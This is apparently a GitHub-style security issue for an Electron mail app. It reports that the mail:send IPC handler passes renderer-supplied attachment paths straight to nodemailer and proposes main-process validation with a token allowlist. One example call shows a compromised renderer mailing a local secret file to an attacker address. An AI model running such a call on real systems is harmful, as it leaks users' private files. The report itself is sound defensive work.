# Harden `mail:send` IPC validation and stop accepting raw attachment paths from the renderer

Suggested labels: `security`, `bug`, `ipc`, `mail`
Priority: high

## Summary

The main process currently accepts an unvalidated `OutgoingMessage` object from
the renderer and forwards raw attachment paths directly to `nodemailer`. In an
Electron app, the renderer must be treated as untrusted. A compromised renderer
can therefore turn `mail:send` into an arbitrary local file read and exfiltration
primitive.

## Current behavior

- `window.api.sendMail()` is exposed in the preload bridge.
- `mail:send` validates `accountId` but does not validate `msg`.
- `nodemailer` receives `msg.attachments` as-is and will read attachment paths
  from disk on the main-process side.
- Attachment size checks and file selection rules currently live only in the
  renderer compose UI, which is not a security boundary.

## Why this matters

If the renderer is compromised through a future XSS bug, dependency issue, or
malicious injected script, an attacker can call:

```ts
window.api.sendMail(accountId, {
  to: ["attacker@example.com"],
  subject: "leak",
  textBody: "see attachment",
  attachments: [{ path: "C:\\Users\\<user>\\secret.txt" }]
})
```

The main process will then ask `nodemailer` to read that file and attach it to
the outgoing message.

This is exactly the kind of cross-boundary trust failure Electron apps need to
avoid.

## Relevant code

- `src/preload/index.ts`
- `src/main/ipc-handlers.ts`
- `src/main/smtp-client.ts`
- `src/renderer/components/ComposeWindow.tsx`

### Exact locations

**OutgoingMessage type** — `src/main/smtp-client.ts`, lines 6–16:

```typescript
export interface OutgoingMessage {
  to:          string[]
  cc?:         string[]
  bcc?:        string[]
  subject:     string
  textBody:    string
  htmlBody?:   string
  attachments?: { path: string }[]
  inReplyTo?:  string
  references?: string
}
```

**Preload bridge** — `src/preload/index.ts`, line 57:

```typescript
sendMail: (accountId: string, msg: OutgoingMessage) =>
  ipcRenderer.invoke('mail:send', accountId, msg) as Promise<void>,
```

**IPC handler (no msg validation)** — `src/main/ipc-handlers.ts`, lines 263–271:

```typescript
ipcMain.handle('mail:send', async (_event, accountId: string, msg: OutgoingMessage) => {
  resetLockTimer()
  const validId = validateAccountId(accountId)
  const account = accounts.find((a) => a.id === validId)
  if (!account) throw new Error('Konto nicht gefunden.')
  await sendMail(account, msg)     // ← msg passed without validation
  auditInfo('mail.sent', { accountId: validId, recipientCount: msg.to.length })
})
```

**Attachments passed directly to nodemailer** — `src/main/smtp-client.ts`, lines 39–50:

```typescript
await transport.sendMail({
  from:        `${account.displayName} <${account.emailAddress}>`,
  to:          msg.to.join(', '),
  cc:          msg.cc?.join(', '),
  bcc:         msg.bcc?.join(', '),
  subject:     msg.subject,
  text:        msg.textBody,
  html:        msg.htmlBody,
  attachments: msg.attachments,  // ← line 47: raw path pass-through
  inReplyTo:   msg.inReplyTo,
  references:  msg.references
})
```

**Renderer-only validation** — `src/renderer/components/ComposeWindow.tsx`, lines 25–52:

```typescript
async function handleAddAttachment(): Promise<void> {
  const result = await window.api.openFileDialog()
  if (!result.canceled && result.filePaths) {
    // ...
    for (const path of result.filePaths) {
      if (fileSize > 25 * 1024 * 1024) { ... }      // line 36: 25 MB per file
      totalSize += fileSize
      if (totalSize > 100 * 1024 * 1024) { ... }    // line 42: 100 MB total
      newAttachments.push({ path, name: fileName, size: fileSize })
    }
  }
}
```

Send call at **lines 78–88** maps `attachments.map(a => ({ path: a.path }))` — raw paths sent to main.

## Expected behavior

The main process should fully validate outbound mail payloads and should not
trust attachment file paths provided by the renderer.

## Suggested fix

### Approach: Main-process attachment allowlist

**Step 1 — Track approved files** in `src/main/ipc-handlers.ts`:

```typescript
// Session-scoped allowlist of files the user selected via dialog
const approvedAttachments = new Map<string, { path: string; size: number }>()

// In the openFileDialog handler: after dialog result, register each file
for (const filePath of result.filePaths) {
  const token = crypto.randomUUID()
  const stat = statSync(filePath)
  approvedAttachments.set(token, { path: filePath, size: stat.size })
}
// Return tokens (not paths) to renderer
```

**Step 2 — Validate OutgoingMessage** in the `mail:send` handler (lines 263–271):

Add before `sendMail(account, msg)`:

```typescript
// Validate structure
if (!Array.isArray(msg.to) || msg.to.length === 0) throw new Error('Invalid recipients')
if (typeof msg.subject !== 'string') throw new Error('Invalid subject')
if (typeof msg.textBody !== 'string') throw new Error('Invalid body')

// Resolve attachment tokens → real paths
if (msg.attachments?.length) {
  if (msg.attachments.length > 20) throw new Error('Too many attachments')
  let totalSize = 0
  msg.attachments = msg.attachments.map(a => {
    const approved = approvedAttachments.get(a.token)
    if (!approved) throw new Error('Unapproved attachment')
    totalSize += approved.size
    if (totalSize > 100 * 1024 * 1024) throw new Error('Total size exceeded')
    return { path: approved.path }
  })
}
```

**Step 3 — Update preload/renderer** to use tokens instead of raw paths.

### Simpler alternative (if token approach is too invasive)

Keep paths but add a main-process allowlist check:

```typescript
// In mail:send handler, before sendMail():
for (const att of msg.attachments ?? []) {
  const resolved = resolve(att.path)
  if (!approvedPaths.has(resolved)) throw new Error('Unapproved attachment path')
  const stat = statSync(resolved)
  if (stat.size > 25 * 1024 * 1024) throw new Error('Attachment too large')
}
```

## Acceptance criteria

- `mail:send` rejects malformed message objects at runtime.
- The renderer cannot cause the main process to attach arbitrary local files by
  passing a filesystem path directly.
- Attachment size and count checks are enforced in main, not only in renderer.
- Existing compose flow still works for valid attachments chosen via the UI.
- Regression tests cover malicious or malformed `mail:send` payloads.

## Test ideas

- Unit test: reject attachments containing raw unapproved paths.
- Unit test: reject recipient arrays with invalid types or injection characters.
- Unit test: reject oversized attachments or too many attachments.
- Positive test: valid UI-selected attachment still sends successfully.
